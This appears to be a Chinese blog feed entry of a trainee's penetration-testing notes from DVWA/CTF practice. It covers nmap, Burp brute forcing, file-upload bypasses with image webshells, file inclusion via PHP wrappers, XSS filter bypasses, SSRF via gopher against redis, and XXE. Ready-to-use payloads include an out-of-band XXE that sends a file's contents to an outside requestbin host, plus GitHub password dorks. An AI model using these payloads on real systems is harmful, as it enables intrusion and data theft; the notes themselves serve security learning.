      <title>TEST</title>
      <link href="/test/"/>
      <url>/test/</url>
      
        <content type="html"><![CDATA[<h1 id="第一周笔记"><a href="#第一周笔记" class="headerlink" title="第一周笔记"></a>第一周笔记</h1><h2 id="8-2"><a href="#8-2" class="headerlink" title="8.2"></a><em>8.2</em></h2><h2 id="1、github社工"><a href="#1、github社工" class="headerlink" title="1、github社工"></a>1、github社工</h2><p>例如<br>password @qq.com<br><img src="https://img-blog.csdnimg.cn/20200802094247325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>db_pass<br><img src="https://img-blog.csdnimg.cn/20200802132745709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="2、nmap工具的使用"><a href="#2、nmap工具的使用" class="headerlink" title="2、nmap工具的使用"></a>2、nmap工具的使用</h2><h3 id="常规扫描单个主机"><a href="#常规扫描单个主机" class="headerlink" title="常规扫描单个主机"></a>常规扫描单个主机</h3><p>namp 10.11.30.1</p><h3 id="快速扫描C段"><a href="#快速扫描C段" class="headerlink" title="快速扫描C段"></a>快速扫描C段</h3><p>nmap 10.11.30.1/24 -v </p><h3 id="扫描ipv6"><a href="#扫描ipv6" class="headerlink" title="扫描ipv6"></a>扫描ipv6</h3><p> nmap -6 ipv6</p><h3 id="追踪路由"><a href="#追踪路由" class="headerlink" title="追踪路由"></a>追踪路由</h3><p>nmap 10.11.30.1 –traceroute</p><h3 id="正则匹配ip地址"><a href="#正则匹配ip地址" class="headerlink" title="正则匹配ip地址"></a>正则匹配ip地址</h3><p> ((25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d))).){3}(25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d)))</p><h3 id="正则替换空白行"><a href="#正则替换空白行" class="headerlink" title="正则替换空白行"></a>正则替换空白行</h3><p> ^\s*(?=\r?$)\n </p><h2 id="3、dvwa工具的使用"><a href="#3、dvwa工具的使用" class="headerlink" title="3、dvwa工具的使用"></a>3、dvwa工具的使用</h2><p> 添加扫描的地址<br><img src="https://img-blog.csdnimg.cn/20200802131553825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>开始扫描<br><img src="https://img-blog.csdnimg.cn/20200802132140924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>漏洞分析<br><img src="https://img-blog.csdnimg.cn/20200802133304567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>网站目录<br><img src="https://img-blog.csdnimg.cn/20200802133338520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="4、bp抓包爆破"><a href="#4、bp抓包爆破" class="headerlink" title="4、bp抓包爆破"></a>4、bp抓包爆破</h2><p><img src="https://img-blog.csdnimg.cn/20200802152459240.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200802153544563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>放入intruder并且添加字典<br>开始爆破<br><img src="https://img-blog.csdnimg.cn/20200802153719964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="8-3"><a href="#8-3" class="headerlink" title="8.3"></a><em>8.3</em></h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="绕过前端验证"><a href="#绕过前端验证" class="headerlink" title="绕过前端验证"></a>绕过前端验证</h3><p>设置断点<br><img src="https://img-blog.csdnimg.cn/20200803102813872.png" alt="在这里插入图片描述"></p><p>修改js代码</p><p><img src="https://img-blog.csdnimg.cn/20200803102907630.png" alt="在这里插入图片描述"></p><p>继续</p><p><img src="https://img-blog.csdnimg.cn/20200803102932999.png" alt="在这里插入图片描述"></p><p>上传成功</p><p><img src="https://img-blog.csdnimg.cn/20200803103004545.png" alt="在这里插入图片描述"></p><h3 id="（1）-htaccess绕过黑名单"><a href="#（1）-htaccess绕过黑名单" class="headerlink" title="（1）.htaccess绕过黑名单"></a>（1）.htaccess绕过黑名单</h3><p>首先上传 .htaccess</p><p>内容为 <code>AddType application/x-httpd-php .jpg</code></p><p>接着上传1.jpg 蚁剑连接即可</p><h3 id="（2）MIME绕过"><a href="#（2）MIME绕过" class="headerlink" title="（2）MIME绕过"></a>（2）MIME绕过</h3><p>上传 1.jpg,接着抓包修改文件名为 1.php即可</p><h3 id="（3）文件头检查绕过"><a href="#（3）文件头检查绕过" class="headerlink" title="（3）文件头检查绕过"></a>（3）文件头检查绕过</h3><p>在木马增加图片的文件头，例如 GIF89A</p><p><img src="https://img-blog.csdnimg.cn/20200803104703481.png" alt="在这里插入图片描述"></p><h3 id="4-00绕过-5-2适用"><a href="#4-00绕过-5-2适用" class="headerlink" title="(4)%00绕过 5.2适用"></a>(4)%00绕过 5.2适用</h3><p>上传文件然后抓包修改文件名为1.php%00即可</p><h3 id="5-双写绕过"><a href="#5-双写绕过" class="headerlink" title="(5)双写绕过"></a>(5)双写绕过</h3><p>上传文件名为 1.phphpp</p><h3 id="PS：图片马制作"><a href="#PS：图片马制作" class="headerlink" title="PS：图片马制作"></a><em>PS：图片马制作</em></h3><pre><code>windowscopy pic.jpg/b+shell.php shell.jpglinuxcat shell.php &gt;&gt; shell.png</code></pre><h3 id="windows特性绕过"><a href="#windows特性绕过" class="headerlink" title="windows特性绕过"></a>windows特性绕过</h3><p>windows特性，可在后缀名中加::$DATA</p><p>windows特性，会自动去掉后缀名中最后的”.”</p><p>Windows系统的文件名特性。文件名最后增加空格</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="（1）本地文件包含"><a href="#（1）本地文件包含" class="headerlink" title="（1）本地文件包含"></a>（1）本地文件包含</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//index.php?file=payload.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（2）远程文件包含"><a href="#（2）远程文件包含" class="headerlink" title="（2）远程文件包含"></a>（2）远程文件包含</h3><p>需要开启</p><p>allow_url_fopen</p><p>allow_url_include (PHP 5.2 之后默认为 Off)</p><h3 id="（3）截断包含"><a href="#（3）截断包含" class="headerlink" title="（3）截断包含"></a>（3）截断包含</h3><p>%00截断<br>路径长度截断<br>点号阶段<br>远程文件截断（空格、井号、问号）</p><h3 id="（4）php伪协议"><a href="#（4）php伪协议" class="headerlink" title="（4）php伪协议"></a>（4）php伪协议</h3><p>php://filter/read=convert-base64.encode/resource=flag.php<br>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<br>data://text/plain,<!--?php phpinfo();?--></p><h3 id="（5）其他"><a href="#（5）其他" class="headerlink" title="（5）其他"></a>（5）其他</h3><p>中间件日志、ssh日志、sessions、头像</p><h2 id="8-4"><a href="#8-4" class="headerlink" title="8.4"></a><em>8.4</em></h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h3 id="（1）反射型xss"><a href="#（1）反射型xss" class="headerlink" title="（1）反射型xss"></a>（1）反射型xss</h3><p>low</p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>medium</p><p><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code></p><p>high</p><p>使用img标签<code>&lt;img src='x' onerror=alert(123)&gt;</code></p><p>alert绕过</p><p>①</p><p><code>&lt;script&gt;confirm('XSS')&lt;/script&gt;</code></p><p><code>&lt;script&gt;prompt('XSS')&lt;/script&gt;</code></p><p>②</p><p><code>String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41)</code></p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>以xiuno bss为例</p><p>首先构造 管理员创建用户组的POC</p><p>接着发帖</p><p>最后等待真正的管理员</p><h2 id="8-5"><a href="#8-5" class="headerlink" title="8.5"></a><em>8.5</em></h2><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p><em>ssrf可以做什么</em></p><p>扫描端口、获取服务器信息、扫描内部网络</p><p><em>如何探测</em></p><p><img src="https://img-blog.csdnimg.cn/20200805092155186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><em>怎么利用</em></p><p>file协议、dict协议、gopher协议</p><p>构造gopher协议打redis<br><img src="https://img-blog.csdnimg.cn/20200805094325666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><em>怎么绕过</em></p><p>1、短地址</p><p>2、IP格式绕过</p><p>实战<br>寻找重要文件</p><p><code>file:///etc/hosts</code></p><p><code>file:///proc/net/fib_trie</code></p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>常用payload</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE des [&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml"><code class="language-xml">//test.xml<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE dasctf[        &lt;!ENTITY % remote SYSTEM "http://182.92.91.240/test.dtd" ></span>        %remote;%int;%send;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>books</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>abc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>books</span><span class="token punctuation">></span></span>//test.dtd&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> send SYSTEM 'http://http.requestbin.buuoj.cn/1f1ej7z1?p=%file;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-5-1"><a href="#8-5-1" class="headerlink" title="8.5"></a><em>8.5</em></h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>php常见命令执行函数<br><code>1、system</code><br>string system(string command,int &amp;return_var)</p><p>可以用来执行系统命令并将相应的执行结果输出</p><p><code>2、exec</code></p><p>string exec(string command,array &amp;outpub,int &amp;return_var)</p><p>command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值。</p><p><code>3、passthru</code></p><p>void passthru(string command, int &amp;return_var)</p><p>command是要执行的命令，return_var存放执行命令后的状态值。</p><p><code>4、 shell_exec</code></p><p>string shell_exec(string command)</p><p>command是要执行的命令。</p><p><code>5、``运行符</code></p><p>与shell_exec功能相同，执行shell命令并返回输出的字符串。</p><p><code>6、ob_start</code></p><p>bool ob_start([callback $output_callback[,int $chunk_size[,bool $erase]]])</p><p>ob_start：打开输出控制缓冲</p><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>serialize()将一个对象转换成一个字符串。</p><p>unserialize()将字符串还原为一个对象。</p><p>\x00 + 类名 + \x00 + 变量名 反序列化出来的是private变量</p><p>\x00 + * + \x00 + 变量名 反序列化出来的是protected变量</p><p><strong><code>魔术方法</code></strong><br><img src="https://img-blog.csdnimg.cn/2020080612403234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
